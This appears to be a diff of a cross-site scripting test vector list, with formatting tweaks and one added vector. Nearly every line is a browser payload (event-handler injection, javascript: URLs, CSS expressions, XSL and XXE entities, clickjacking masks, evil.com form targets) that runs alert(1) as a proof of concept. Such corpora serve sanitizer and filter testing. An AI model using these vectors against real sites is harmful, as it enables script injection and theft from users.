@@ -60,12 +60,12 @@ X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
 <div style="[a]color[b]:[c]red">XXX</div>
 <div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
 <!-- IE 6-8 --><x '="foo"><x foo='><img src=x onerror=alert(1)//'><!-- IE 6-9 --><! '="foo"><x foo='><img src=x onerror=alert(2)//'><? '="foo"><x foo='><img src=x onerror=alert(3)//'>
-<embed src="javascript:alert(1)"></embed> // O10.10?, OM10.0?, GC6?, FF<img src="javascript:alert(2)"><image src="javascript:alert(2)"> // IE6, O10.10?, OM10.0?<script src="javascript:alert(3)"></script> // IE6, O11.01?, OM10.1?
+<embed src="javascript:alert(1)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF<img src="javascript:alert(2)"><image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓
 <!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>
 <svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
 <?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?><root/>
-<!DOCTYPE x [	<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(1)" onload CDATA "alert(2)">]><img />
-<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">	<html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x></doc>
+<!DOCTYPE x [<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(1)" onload CDATA "alert(2)">]><img />
+<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"><html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x></doc>
 <card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>
 <div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
 <// style=x:expression\28write(1)\29>
@@ -77,7 +77,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
 <?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
 <?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
 <object allowscriptaccess="always" data="test.swf"></object>
-<style>*{x:expression(write(1))}</style>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style>
 <x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
 <?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
 <x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
@@ -114,11 +114,11 @@ XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!
 <x style="background:url('x[a];color:red;/*')">XXX</x>
 <!--[if]><script>alert(1)</script --><!--[if<img src=x onerror=alert(2)//]> -->
 <div id="x">x</div><xml:namespace prefix="t"><import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;">
-<a href="http://attacker.org">	<iframe src="http://example.org/"></iframe></a>
-<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">	<h1>Drop me</h1></div><iframe src="http://www.example.org/dropHere.html"></iframe>
+<a href="http://attacker.org"><iframe src="http://example.org/"></iframe></a>
+<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"><h1>Drop me</h1></div><iframe src="http://www.example.org/dropHere.html"></iframe>
 <iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe><textarea type="text" cols="50" rows="10"></textarea>
-<script>function makePopups(){	for (i=1;i<6;i++) {		window.open('popup.html','spam'+i,'width=50,height=50');	}}</script><body><a href="#" onclick="makePopups()">Spam</a>
-<html xmlns="http://www.w3.org/1999/xhtml"xmlns:svg="http://www.w3.org/2000/svg"><body style="background:gray"><iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/><svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">	<svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>	<svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body></html>
+<script>function makePopups(){for (i=1;i<6;i++) {window.open('popup.html','spam'+i,'width=50,height=50');}}</script><body><a href="#" onclick="makePopups()">Spam</a>
+<html xmlns="http://www.w3.org/1999/xhtml"xmlns:svg="http://www.w3.org/2000/svg"><body style="background:gray"><iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/><svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"><svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/><svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body></html>
 <iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
 <span class=foo>Some text</span><a class=bar href="http://www.example.org">www.example.org</a><script src="http://code.jquery.com/jquery-1.4.4.js"></script><script>$("span.foo").click(function() {alert('foo');$("a.bar").click();});$("a.bar").click(function() {alert('bar');location="http://html5sec.org";});</script>
 <script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10<script src="\\example.com\foo.js"></script> // Safari 5.0
@@ -142,8 +142,9 @@ XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!
 <picture><source srcset="x"><img onerror="alert(1)"></picture><picture><img srcset="x" onerror="alert(1)"></picture><img srcset=",,,,,x" onerror="alert(1)">
 <a href="//evil.com" target="_blank" rel="noreferrer">CLICK</a> // window.opener will be null<map><area href="//evil.com" target="_blank" rel="noreferrer">CLICK</area></map> // window.opener will be null<svg><a xlink:href="//evil.com" rel="noreferrer">CLICK</a></svg> // window.opener still works<form action="//evil.com" target="_blank" rel="noreferrer"><input type="submit"></form>// window.opener still works<form id="test" rel="noreferrer"></form><button form="test" formtarget="_blank" formaction="//evil.com">CLICKME</button>// window.opener still works<math href="//evil.com" xlink:show="new" rel="noreferrer">CLICKME</math>// window.opener still works
 <iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe><a href="javascript:&apos;<svg onload&equals;alert&lpar;1&rpar;&nvgt;&apos;">CLICK</a>
-#Chrome, Opera, Safari and Edge<div onfocus="alert(1)" contenteditable tabindex="0" id="xss"></div><div style="-webkit-user-modify:read-write" onfocus="alert(1)" id="xss"><div style="-webkit-user-modify:read-write-plaintext-only" onfocus="alert(1)" id="xss"># Firefox<div onbeforescriptexecute="alert(1)"></div><script>1</script>#MSIE10/11 & Edge<div style="-ms-scroll-limit:1px;overflow:scroll;width:1px" onscroll="alert(1)">#MSIE10<div contenteditable onresize="alert(1)"></div># MSIE11<div onactivate="alert(1)" id="xss" style="overflow:scroll"></div><div onfocus="alert(1)" id="xss" style="display:table"><div id="xss" style="-ms-block-progression:bt" onfocus="alert(1)"><div id="xss" style="-ms-layout-flow:vertical-ideographic" onfocus="alert(1)"><div id="xss" style="float:left" onfocus="alert(1)"># Chrome, Opera, Safari<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div># Chrome, Opera, Safari<style>div {width: 100px;}div:target {width: 200px;}</style><div id="xss" onwebkittransitionend="alert(1)" style="-webkit-transition: width .1s;"></div># Safari<div style="overflow:-webkit-marquee" onscroll="alert(1)"></div>
+#Chrome, Opera, Safari and Edge<div contenteditable onfocus="alert(1)" autofocus></div><div onfocus="alert(1)" contenteditable tabindex="0" id="xss"></div><div style="-webkit-user-modify:read-write" onfocus="alert(1)" id="xss"><div style="-webkit-user-modify:read-write-plaintext-only" onfocus="alert(1)" id="xss"># Firefox<div onbeforescriptexecute="alert(1)"></div><script>1</script>#MSIE10/11 & Edge<div style="-ms-scroll-limit:1px;overflow:scroll;width:1px" onscroll="alert(1)">#MSIE10<div contenteditable onresize="alert(1)"></div># MSIE11<div onactivate="alert(1)" id="xss" style="overflow:scroll"></div><div onfocus="alert(1)" id="xss" style="display:table"><div id="xss" style="-ms-block-progression:bt" onfocus="alert(1)"><div id="xss" style="-ms-layout-flow:vertical-ideographic" onfocus="alert(1)"><div id="xss" style="float:left" onfocus="alert(1)"># Chrome, Opera, Safari<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div># Chrome, Opera, Safari<style>div {width: 100px;}div:target {width: 200px;}</style><div id="xss" onwebkittransitionend="alert(1)" style="-webkit-transition: width .1s;"></div># Safari<div style="overflow:-webkit-marquee" onscroll="alert(1)"></div>
 <frameset onpageshow="alert(1)"><body onpageshow="alert(1)">
 <details open ontoggle="alert(1)">
 <video src onratechange="alert(1)">
 <applet onerror="alert(1)"></applet>
+
